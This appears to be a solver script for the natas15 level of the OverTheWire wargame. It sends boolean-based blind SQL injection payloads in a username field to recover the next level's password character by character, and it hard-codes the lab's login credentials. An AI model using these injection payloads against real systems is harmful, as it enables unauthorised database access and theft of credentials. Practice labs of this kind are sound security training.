import requests
import sys
import time

from string import ascii_letters, digits
from itertools import chain

CHAL_URL  = 'http://natas15.natas.labs.overthewire.org/'
CHAL_USER = 'natas15'
NEXT_USER = 'natas16'
CHAL_PASSWORD = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

SQLI_CHARSET = 'natas16" AND password LIKE BINARY "%%%s%%"; #'
SQLI_PASSWORD = 'natas16" AND password LIKE BINARY "%s%s%%"; #'

PASSWORD_LEN = 32

if __name__ == '__main__':

    creds = requests.auth.HTTPBasicAuth(CHAL_USER, CHAL_PASSWORD)
    charset = []
    password = ''

    print('[*] Constructing charset.')
    for c in chain(ascii_letters, digits):

        response = requests.post(CHAL_URL,
            auth=creds,
            data={ 'username' : SQLI_CHARSET % c},
        )
        if 'This user exists' in response.text:
            print('[$] Adding %s to charset.' % c)
            charset.append(c)

    print('[*] Using charset')
    print('     |')
    print('     ---> %s' % ' '.join(charset))


    print()
    print('[*] Bruteforcing %s password.' % NEXT_USER)
    for i in range(0, PASSWORD_LEN):

        for c in charset:

            response = requests.post(CHAL_URL,
                auth=creds,
                data={ 'username' : SQLI_PASSWORD % (password, c)},
            )
            if 'This user exists' in response.text:
                password = '%s%s' % (password, c)
                print('[*] Constructing password: %s' % password)
                break

    print()
    print('[$] Login for next level %s:%s' % (NEXT_USER, password))
